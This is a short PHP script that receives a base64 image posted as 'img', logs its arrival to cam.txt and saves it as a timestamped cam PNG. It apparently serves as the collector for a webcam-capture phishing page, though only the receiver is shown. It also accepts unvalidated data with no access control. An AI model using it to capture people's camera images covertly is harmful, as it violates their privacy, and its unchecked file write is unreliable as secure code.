<?php
	$date = date('dMYHis');
	$imageData = $_POST['img'];

	if (!empty($imageData)) {
		error_log("Photo received!".substr(getcwd(), 0, 49)."\r\n", 3, "cam.txt");
	}

	$filteredData = substr($imageData, strpos($imageData, ",") + 1);
	$unencodedData = base64_decode($filteredData);

	$dir = substr(getcwd(), 0, 49);	
	$file = $dir.'cam'.$date.'.png';
	file_put_contents($file, $unencodedData);
	exit();
?>
